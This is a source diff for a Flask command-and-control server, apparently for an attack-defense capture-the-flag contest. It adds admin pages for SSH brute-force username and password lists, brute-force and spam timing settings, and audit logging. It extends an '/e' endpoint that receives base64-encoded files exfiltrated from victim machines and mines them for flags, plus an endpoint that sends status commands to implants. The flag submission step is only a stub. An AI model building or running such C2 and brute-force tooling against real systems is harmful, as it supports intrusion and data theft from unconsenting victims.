@@ -1,3 +1,4 @@
+import re
 from base64 import b64decode
 from datetime import datetime
 
@@ -15,11 +16,15 @@ LOG_FILE = "c2.log"
 # Default settings
 DEFAULT_SUBNET = "172.16.T.B"
 DEFAULT_WHITELISTED_IPS = "127.0.0.1"
+DEFAULT_FLAG_REGEX = "NCX\{[^\{\}]{1,100}\}"
+DEFAULT_SSH_INTERVAL = "30"
+DEFAULT_SPAM_INTERVAL_MIN = "10"
+DEFAULT_SPAM_INTERVAL_MAX = "30"
 
 # Create Flask and database
 app = Flask(__name__, template_folder=TEMPLATE_DIR)
 app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///" + DB_FILE
-app.secret_key = "poop"
+app.secret_key = "CyberChef2"
 db = SQLAlchemy(app)
 Bootstrap(app)
 
@@ -29,17 +34,26 @@ def main():
     db.create_all()
 
     # Create default settings
-    if not Setting.query.get("subnet"):
-        db.session.add(Setting("subnet", DEFAULT_SUBNET,
-                               "Subnet teams are on, T should replace team number and B should replace box IP"))
-        db.session.commit()
-    if not Setting.query.get("whitelisted_ips"):
-        db.session.add(Setting("whitelisted_ips", DEFAULT_WHITELISTED_IPS,
-                               "IPs, separated by commas and no spaces, that are allowed to access admin site"))
-        db.session.commit()
+    add_setting("subnet", DEFAULT_SUBNET,
+                "Subnet teams are on, T should replace team number and B should replace box IP")
+    add_setting("whitelisted_ips", DEFAULT_WHITELISTED_IPS,
+                "IPs, separated by commas and no spaces, that are allowed to access admin site")
+    add_setting("flag_regex", DEFAULT_FLAG_REGEX, "Regex to search for flags with")
+    add_setting("ssh_interval", DEFAULT_SSH_INTERVAL, "Seconds to wait between each SSH brute force")
+    add_setting("spam_interval_min", DEFAULT_SPAM_INTERVAL_MIN, "Minimum seconds to wait between each spam")
+    add_setting("spam_interval_max", DEFAULT_SPAM_INTERVAL_MAX, "Maximum seconds to wait between each spam")
 
     # Start Flask
     app.run(port=PORT, debug=DEBUG)
+
+
+# <editor-fold desc="Admin Endpoints">
+
+# Catch all 404s and 405s
+@app.errorhandler(404)
+@app.errorhandler(405)
+def catch_all(e):
+    return ""
 
 
 # Protect the admin routes
@@ -48,6 +62,7 @@ def check_admin():
     settings = Setting.query.get("whitelisted_ips")
     ips = settings.value.split(",")
     if request.path.startswith("/admin") and request.remote_addr not in ips:
+        log("flask", f"{request.remote_addr} tried to access {request.path}")
         return ""
 
 
@@ -78,6 +93,7 @@ def admin_settings_update():
 
     # Flash and redirect
     flash("Setting updated")
+    log("admin", f"setting {name} changed to {value} by {request.remote_addr}")
     return redirect(url_for("admin_settings"))
 
 
@@ -100,6 +116,7 @@ def admin_teams_add():
 
     # Flash and redirect
     flash("Team added")
+    log("admin", f"team {num} added by {request.remote_addr}")
     return redirect(url_for("admin_teams"))
 
 
@@ -115,6 +132,7 @@ def admin_teams_delete():
 
     # Flash and redirect
     flash("Team deleted")
+    log("admin", f"team {num} deleted by {request.remote_addr}")
     return redirect(url_for("admin_teams"))
 
 
@@ -131,6 +149,7 @@ def admin_teams_update():
 
     # Flash and redirect
     flash("Team updated")
+    log("admin", f"team {num} updated by {request.remote_addr}")
     return redirect(url_for("admin_teams"))
 
 
@@ -155,6 +174,7 @@ def admin_services_add():
 
     # Flash and redirect
     flash("Service added")
+    log("admin", f"service {ip} added by {request.remote_addr}")
     return redirect(url_for("admin_services"))
 
 
@@ -170,6 +190,7 @@ def admin_services_delete():
 
     # Flash and redirect
     flash("Service deleted")
+    log("admin", f"service {ip} deleted by {request.remote_addr}")
     return redirect(url_for("admin_services"))
 
 
@@ -190,6 +211,7 @@ def admin_services_update():
 
     # Flash and redirect
     flash("Service updated")
+    log("admin", f"service {ip} updated by {request.remote_addr}")
     return redirect(url_for("admin_services"))
 
 
@@ -219,6 +241,7 @@ def admin_exfils_view():
     exfil_data = ExfilData.query.get(id)
 
     # Return the data
+    log("admin", f"exfil {id} viewed by {request.remote_addr}")
     return exfil_data.data
 
 
@@ -241,6 +264,7 @@ def admin_msfs_add():
 
     # Flash and redirect
     flash("MSF exploit added")
+    log("admin", f"MSF exploit added by {request.remote_addr}")
     return redirect(url_for("admin_msfs"))
 
 
@@ -256,6 +280,7 @@ def admin_msfs_delete():
 
     # Flash and redirect
     flash("MSF exploit deleted")
+    log("admin", f"MSF exploit {id} deleted by {request.remote_addr}")
     return redirect(url_for("admin_msfs"))
 
 
@@ -278,6 +303,7 @@ def admin_msfs_update():
 
     # Flash and redirect
     flash("MSF exploit updated")
+    log("admin", f"MSF exploit {id} updated by {request.remote_addr}")
     return redirect(url_for("admin_msfs"))
 
 
@@ -300,6 +326,7 @@ def admin_flagrets_add():
 
     # Flash and redirect
     flash("Flag retrieval added")
+    log("admin", f"flag retrieval added by {request.remote_addr}")
     return redirect(url_for("admin_flagrets"))
 
 
@@ -315,6 +342,7 @@ def admin_flagrets_delete():
 
     # Flash and redirect
     flash("Flag retrieval deleted")
+    log("admin", f"flag retrieval {id} deleted by {request.remote_addr}")
     return redirect(url_for("admin_flagrets"))
 
 
@@ -335,8 +363,115 @@ def admin_flagrets_update():
 
     # Flash and redirect
     flash("Flag retrieval updated")
+    log("admin", f"flag retrieval {id} updated by {request.remote_addr}")
     return redirect(url_for("admin_flagrets"))
 
+
+@app.route("/admin/ssh", methods=["GET"])
+def admin_ssh():
+    return render_template("ssh.html", usernames=SSHUsername.query.order_by(SSHUsername.username).all(),
+                           passwords=SSHPassword.query.order_by(SSHPassword.password).all())
+
+
+@app.route("/admin/ssh/usernames/add", methods=["POST"])
+def admin_ssh_usernames_add():
+    # Get form data
+    username = request.form.get("username")
+
+    # Add to database
+    db.session.add(SSHUsername(username))
+    db.session.commit()
+
+    # Flash and redirect
+    flash("SSH username added")
+    log("admin", f"SSH username {username} added by {request.remote_addr}")
+    return redirect(url_for("admin_ssh"))
+
+
+@app.route("/admin/ssh/passwords/add", methods=["POST"])
+def admin_ssh_passwords_add():
+    # Get form data
+    password = request.form.get("password")
+
+    # Add to database
+    db.session.add(SSHPassword(password))
+    db.session.commit()
+
+    # Flash and redirect
+    flash("SSH password added")
+    log("admin", f"SSH password {password} added by {request.remote_addr}")
+    return redirect(url_for("admin_ssh"))
+
+
+@app.route("/admin/ssh/usernames/delete", methods=["GET"])
+def admin_ssh_usernames_delete():
+    # Get parameters
+    username = request.args.get("username")
+
+    # Delete from database
+    ssh_username = SSHUsername.query.get(username)
+    db.session.delete(ssh_username)
+    db.session.commit()
+
+    # Flash and redirect
+    flash("SSH username deleted")
+    log("admin", f"SSH username {username} deleted by {request.remote_addr}")
+    return redirect(url_for("admin_ssh"))
+
+
+@app.route("/admin/ssh/passwords/delete", methods=["GET"])
+def admin_ssh_passwords_delete():
+    # Get parameters
+    password = request.args.get("password")
+
+    # Delete from database
+    ssh_password = SSHPassword.query.get(password)
+    db.session.delete(ssh_password)
+    db.session.commit()
+
+    # Flash and redirect
+    flash("SSH password deleted")
+    log("admin", f"SSH password {password} deleted by {request.remote_addr}")
+    return redirect(url_for("admin_ssh"))
+
+
+@app.route("/admin/ssh/usernames/update", methods=["POST"])
+def admin_ssh_usernames_update():
+    # Get form data
+    old_username = request.form.get("old_username")
+    username = request.form.get("username")
+
+    # Update in database
+    ssh_username = SSHUsername.query.get(old_username)
+    ssh_username.username = username
+    db.session.commit()
+
+    # Flash and redirect
+    flash("SSH username updated")
+    log("admin", f"SSH username {username} updated by {request.remote_addr}")
+    return redirect(url_for("admin_ssh"))
+
+
+@app.route("/admin/ssh/passwords/update", methods=["POST"])
+def admin_ssh_passwords_update():
+    # Get form data
+    old_password = request.form.get("old_password")
+    password = request.form.get("password")
+
+    # Update in database
+    ssh_password = SSHPassword.query.get(old_password)
+    ssh_password.password = password
+    db.session.commit()
+
+    # Flash and redirect
+    flash("SSH password updated")
+    log("admin", f"SSH password {password} updated by {request.remote_addr}")
+    return redirect(url_for("admin_ssh"))
+
+
+# </editor-fold>
+
+# <editor-fold desc="Malware Endpoints">
 
 # Exfil route
 @app.route("/e", methods=["POST"])
@@ -348,20 +483,20 @@ def exfil():
 
     # Check if it exists
     if not victimip:
-        log("Exfil - victimip missing")
+        log("exfil_endpoint", f"victimip missing from {request.remote_addr}")
         return ""
     elif not filename:
-        log("Exfil - filename missing")
+        log("exfil_endpoint", f"filename missing from {request.remote_addr}")
         return ""
     elif not data:
-        log("Exfil - file missing")
+        log("exfil_endpoint", f"data missing from {request.remote_addr}")
         return ""
 
     # Decode data
     try:
         exfil = b64decode(data).decode("utf-8")
     except:
-        log(f"Exfil - b64 decode error for {data} on host {victimip}")
+        log("exfil_endpoint", f"b64 decode error on victimip {victimip} from {request.remote_addr}")
         return ""
 
     # Get team and service
@@ -369,17 +504,19 @@ def exfil():
         team = victimip.split(".")[2]
         service = victimip.split(".")[3]
     except:
-        log(f"Exfil - error decoding IP {victimip} for file {filename}")
+        log("exfil_endpoint", f"error decoding IP {victimip} from {request.remote_addr}")
         return ""
 
-    # Save the data
+    # Save the data and extract flags
     try:
         db.session.add(ExfilData(team, service, filename, exfil, datetime.now()))
         db.session.commit()
     except:
-        log(f"Exfil - error adding data for team {team} and service {service} for file {filename}")
+        log("exfil_endpoint",
+            f"error adding data for team {team} and service {service} for file {filename} from {request.remote_addr}")
         return ""
-    log(f"Exfil - saved data from team {team} and service {service}")
+    extract_flags(exfil, team, service, "exfil")
+    log("exfil_endpoint", f"saved data from team {team} and service {service} from {request.remote_addr}")
     return ""
 
 
@@ -391,7 +528,7 @@ def update():
 
     # Check if it exists
     if not victimip:
-        log("Update - victimip missing")
+        log("update_endpoint", f"victimip missing from {request.remote_addr}")
         return ""
 
     # Get team and service
@@ -399,13 +536,13 @@ def update():
         team = victimip.split(".")[2]
         service = victimip.split(".")[3]
     except:
-        log(f"Update - error decoding IP {victimip}")
+        log("update_endpoint", f"error decoding IP {victimip} from {request.remote_addr}")
         return ""
 
     # Get the Box
     box = Box.query.get((team, service))
     if not box:
-        log(f"Update - no record for team {team} and service {service}")
+        log("update_endpoint", f"no record for team {team} and service {service} from {request.remote_addr}")
         return ""
 
     # Update the Box
@@ -414,20 +551,57 @@ def update():
     db.session.commit()
 
     # Return the status
-    log(f"Update - status {box.status} sent to team {team} and service {service}")
+    log("update_endpoint", f"status {box.status} sent to team {team} and service {service} from {request.remote_addr}")
     return box.status
 
 
-# Catch all 404s and 405s
-@app.errorhandler(404)
-@app.errorhandler(405)
-def catch_all(e):
-    return ""
+# </editor-fold>
 
+# <editor-fold desc="Functions">
 
 def half_subnet():
     parts = Setting.query.get("subnet").value.split(".")
     return f"{parts[0]}.{parts[1]}."
+
+
+def add_setting(name, default, description):
+    if not Setting.query.get(name):
+        db.session.add(Setting(name, default, description))
+        db.session.commit()
+
+
+def extract_flags(data, team_num, service_ip, source):
+    # Find and add the new flags to the database
+    regex = re.compile(Setting.query.get("flag_regex"))
+    flags = re.findall(regex, data)
+    new_flags = []
+    for flag in flags:
+        if not Flag.query.get(flag):
+            new_flag = Flag(flag, team_num, service_ip, source, datetime.now(), None)
+            new_flags.append(new_flag)
+            db.session.add(new_flag)
+            db.session.commit()
+            log("extract_flags", f"new flag {flag} added from team {team_num} and service {service_ip} from {source}")
+
+    # Submit the flags
+    for flag in new_flags:
+        # TODO: submit the flag and check for success
+        success = True
+        if success:
+            flag.submitted = datetime.now()
+            db.session.commit()
+            log("extract_flags",
+                f"flag {flag} successfully submitted from team {team_num} and service {service_ip} from {source}")
+
+
+def log(type, message):
+    # Add to database
+    db.session.add(Log(type, datetime.now(), message))
+    db.session.commit()
+
+    # Write to log file
+    with open(LOG_FILE, "a+") as f:
+        f.write(f"[{type}] [{datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {message}\n")
 
 
 def str_to_bool(s):
@@ -439,14 +613,20 @@ def str_to_bool(s):
         return None
 
 
-def log(info):
-    print(info)
-    with open(LOG_FILE, "a+") as f:
-        f.write(f"{datetime_string()} - {info}\n")
+# </editor-fold>
 
+# <editor-fold desc="Objects">
 
-def datetime_string():
-    return datetime.now().strftime("%m/%d/%Y %H:%M:%S")
+class Log(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    type = db.Column(db.Text, nullable=False)
+    datetime = db.Column(db.DateTime, nullable=False)
+    message = db.Column(db.Text, nullable=False)
+
+    def __init__(self, type, datetime, message):
+        self.type = type
+        self.datetime = datetime
+        self.message = message
 
 
 class Setting(db.Model):
@@ -507,13 +687,15 @@ class Flag(db.Model):
     team = db.relationship(Team, backref=db.backref("flags", cascade="all, delete-orphan"))
     service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
     service = db.relationship(Service, backref=db.backref("flags", cascade="all, delete-orphan"))
+    source = db.Column(db.Text, nullable=False)
     found = db.Column(db.DateTime, nullable=False)
     submitted = db.Column(db.DateTime, nullable=True)
 
-    def __init__(self, flag, team_num, service_ip, found, submitted):
+    def __init__(self, flag, team_num, service_ip, source, found, submitted):
         self.flag = flag
         self.team_num = team_num
         self.service_ip = service_ip
+        self.source = source
         self.found = found
         self.submitted = submitted
 
@@ -579,6 +761,8 @@ class SSHPassword(db.Model):
     def __init__(self, password):
         self.password = password
 
+
+# </editor-fold>
 
 if __name__ == "__main__":
     main()
